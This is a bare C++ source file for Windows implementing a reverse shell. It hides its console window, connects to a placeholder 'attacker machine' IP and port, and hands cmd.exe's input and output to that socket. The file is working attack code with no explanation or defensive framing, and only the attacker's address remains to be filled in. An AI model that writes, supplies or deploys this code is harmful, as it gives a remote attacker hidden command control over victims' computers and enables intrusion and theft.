#include <iostream>
#include <Windows.h>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string>

#pragma comment(lib, "Ws2_32.lib")

using namespace std;

int main() {

    // Hide console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);

    // IP address and port of the attacker machine -  INSERT HERE << "X"
    string ip = "XXX.XXX.X.X";
    int port = XXX;

    addr.sin_addr.s_addr = inet_addr(ip.c_str());
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    // Redirecting input/output to the remote server
    STARTUPINFO sInfo;
    PROCESS_INFORMATION pInfo;
    ZeroMemory(&sInfo, sizeof(sInfo));
    sInfo.cb = sizeof(sInfo);
    sInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)server;
    CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);

    // Wait for the process to exit
    WaitForSingleObject(pInfo.hProcess, INFINITE);

    // Clean up
    closesocket(server);
    WSACleanup();

    return 0;
}
